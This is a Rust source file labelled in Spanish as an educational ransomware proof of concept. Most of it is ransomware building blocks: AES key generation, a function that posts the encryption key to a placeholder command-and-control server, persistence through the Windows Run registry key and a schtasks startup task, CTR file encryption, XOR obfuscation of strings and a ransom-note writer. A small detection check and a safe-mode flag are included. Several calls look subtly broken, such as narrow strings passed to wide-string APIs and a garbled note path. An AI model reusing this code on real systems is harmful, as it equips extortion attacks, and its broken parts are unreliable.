/*!
   ============================================================================================
   EDUCATIONAL RANSOMWARE PoC
   ---------------------------
   Este proyecto es un PoC para demostrar el flujo de un ransomware
   básico: generación de claves, cifrado/descifrado de archivos, persistencia y nota de rescate.

   QUE HACE:
   - Muestra cómo se implementan técnicas de ofuscación (xor_string).
   - Explica persistencia simple (registro y tarea programada).
   - Incluye un “modo seguro” para no dañar archivos reales.
   - Ofrece una sección de “detección” para mostrar cómo se podría descubrir este ransomware.

   NO EJECUTAR EN SISTEMAS DE PRODUCCIÓN. USO BAJO TU PROPIO RIESGO, SOLO EN LABORATORIOS CONTROLADOS.
   ============================================================================================
*/

extern crate aes;
extern crate rand;
extern crate reqwest;
extern crate walkdir;
extern crate base64;

use aes::cipher::{KeyIvInit, StreamCipher};
use rand::Rng;
use reqwest::blocking::Client;
use reqwest::header::USER_AGENT;
use walkdir::WalkDir;
use std::ffi::CString;
use std::fs::{File, remove_file};
use std::io::{Read, Write};
use std::os::windows::ffi::OsStringExt;
use std::path::Path;
use std::process::Command;
use std::ptr;
use std::thread;
use std::time::Duration;
use winapi::um::winreg::{RegCreateKeyExW, RegSetValueExW};
use winapi::um::winnt::{KEY_WRITE, REG_SZ};

const BUFFER_SIZE: usize = 1024;
const XOR_KEY: u8 = 42; // Para ofuscación simple de cadenas

// =====================================================================================
// MÓDULO DE DETECCIÓN (EJEMPLO BÁSICO)
// =====================================================================================
mod detection {
    use std::path::Path;
    /// Comprueba si existe un archivo de rescate como indicador de ransomware.
    pub fn ransom_note_detected(note_path: &str) -> bool {
        Path::new(note_path).exists()
    }
}

// =====================================================================================
// FUNCIÓN DE OFUSCACIÓN BÁSICA (XOR)
// =====================================================================================
fn xor_string(data: &str, key: u8) -> String {
    data.bytes().map(|b| (b ^ key) as char).collect()
}

// =====================================================================================
// GENERACIÓN DE CLAVE AES E IV
// =====================================================================================
fn generate_key() -> (Vec<u8>, Vec<u8>) {
    let key: Vec<u8> = (0..32).map(|_| rand::thread_rng().gen::<u8>()).collect(); // 256 bits
    let iv: Vec<u8> = (0..16).map(|_| rand::thread_rng().gen::<u8>()).collect();  // 128 bits
    (key, iv)
}

// =====================================================================================
// COMUNICACIÓN CON SERVIDOR DE COMANDO Y CONTROL (C2)
// =====================================================================================
fn send_key_to_c2(key: &[u8], iv: &[u8]) {
    let client = Client::new();
    let url = "https://yourc2server.com/receive_key";

    let data = serde_json::json!({
        "key": base64::encode(key),
        "iv": base64::encode(iv)
    });

    let _res = client.post(url)
        .header(USER_AGENT, "MyRansomware")
        .json(&data)
        .send()
        .expect("Failed to send data to C2");
}

// =====================================================================================
// PERSISTENCIA SIMPLE EN WINDOWS
// =====================================================================================
fn add_to_registry() {
    unsafe {
        let hkey = winapi::um::winreg::HKEY_LOCAL_MACHINE;
        let subkey = CString::new(r"Software\Microsoft\Windows\CurrentVersion\Run").unwrap();
        let app_name = CString::new("MyRansomware").unwrap();
        let app_path = CString::new(r"C:\path\to\your\ransomware.exe").unwrap();

        let mut hkey_result = std::ptr::null_mut();
        RegCreateKeyExW(
            hkey,
            subkey.as_ptr(),
            0,
            std::ptr::null_mut(),
            0,
            KEY_WRITE,
            std::ptr::null_mut(),
            &mut hkey_result,
            std::ptr::null_mut()
        );
        RegSetValueExW(
            hkey_result,
            app_name.as_ptr(),
            0,
            REG_SZ,
            app_path.as_ptr() as *const u8,
            app_path.to_bytes().len() as u32
        );
    }
}

fn create_task() {
    Command::new("schtasks")
        .arg("/create")
        .arg("/tn")
        .arg("MyRansomware")
        .arg("/tr")
        .arg(r"C:\path\to\your\ransomware.exe")
        .arg("/sc")
        .arg("onstart")
        .output()
        .expect("Failed to create scheduled task");
}

// =====================================================================================
// CIFRADO / DESCIFRADO DINÁMICO (CTR) - EJEMPLO BÁSICO
// =====================================================================================
fn dynamic_encrypt(buffer: &mut [u8], key: &[u8], iv: &[u8]) {
    let mut cipher = aes::ctr::Ctr256BE::new_from_slices(key, iv)
        .expect("Error creating cipher in CTR mode");
    cipher.apply_keystream(buffer);
}

fn dynamic_decrypt(buffer: &mut [u8], key: &[u8], iv: &[u8]) {
    dynamic_encrypt(buffer, key, iv);
}

// =====================================================================================
// CREAR NOTA DE RESCATE
// =====================================================================================
fn create_ransom_note() {
    let note_path = xor_string("C:\\Users\\YourUser\\ransom_note.txt", XOR_KEY);
    let mut note_file = File::create(&note_path).expect("Unable to create ransom note");
    let note_content = xor_string("Your files have been encrypted!", XOR_KEY);
    writeln!(note_file, "{}", note_content).expect("Error writing ransom note");
}

// =====================================================================================
// MAIN
// =====================================================================================
fn main() {
    let args: Vec<String> = std::env::args().collect();
    let safe_mode = args.iter().any(|arg| arg == "--safe-mode");

    if safe_mode {
        println!("MODO SEGURO ACTIVADO: No se cifrarán archivos reales");
    }

    let ransom_note_path = xor_string("C:\\Users\\YourUser\\ransom_note.txt", XOR_KEY);
    if detection::ransom_note_detected(&ransom_note_path) {
        println!("[DETECTION] Ya existe una nota de rescate en el sistema.");
    }
}
